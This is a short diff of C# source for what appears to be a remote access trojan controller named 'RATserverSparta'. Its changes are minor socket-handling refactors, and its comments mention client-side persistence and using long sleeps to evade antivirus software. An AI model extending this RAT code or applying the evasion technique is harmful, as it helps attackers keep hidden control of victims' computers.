@@ -25,7 +25,6 @@ namespace RATserverSparta.Client
         private MainGUI MainGUI_Instance;
         private System.Net.Sockets.Socket ClientSocket;
         private bool ClientConnected;
-        private SocketSend Data;
         public Client(MainGUI MainGUI_Instance, System.Net.Sockets.Socket Server) 
         {
             this.MainGUI_Instance = MainGUI_Instance;
@@ -56,7 +55,7 @@ namespace RATserverSparta.Client
 
                     switch (type)
                     {
-                        case 0: this.Data.Send(null, 0); this.ClientConnected = false; break; //Logout
+                        case 0: this.ClientConnected = false; break; //Logout
                         case 1: chatMessageEvent(data); break; //chat message
 
                             //GUI Column Creating (Start)
@@ -101,7 +100,6 @@ namespace RATserverSparta.Client
 
             //Creating instance to the Client Message Send class
             SocketSend ClientData = new SocketSend(ClientSocket);
-            this.Data = ClientData;
 
             //Type 20 stands for persistence. This thing will happen at the client side.
             //Long sleeps Helping evade the anti virus, And thats because anti virus dont want to use too many resources, when programs are using long sleeps, it may help evade the AV (Anti Virus) softwares.
